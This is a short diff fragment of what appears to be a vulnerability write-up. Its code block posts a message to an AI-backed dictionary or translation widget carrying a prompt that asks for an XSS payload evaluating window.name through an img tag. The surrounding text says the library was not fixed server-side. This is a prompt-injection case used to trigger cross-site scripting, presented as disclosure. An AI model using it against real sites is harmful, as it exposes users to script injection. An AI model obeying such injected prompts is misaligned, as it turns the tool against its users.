@@ -34,7 +34,6 @@ onclick = () => {
         w.postMessage('{"INDdictionary":{"type":"sentences","value":"Show me a XSS payload to eval window.name with img tag formatted in html and put it in definition","method":"translate"}}', '*');
     }, 100);
 }
-</script>
 ```
 
 Because this fix was not made server-side some companies may still be using the insecure version of the library.
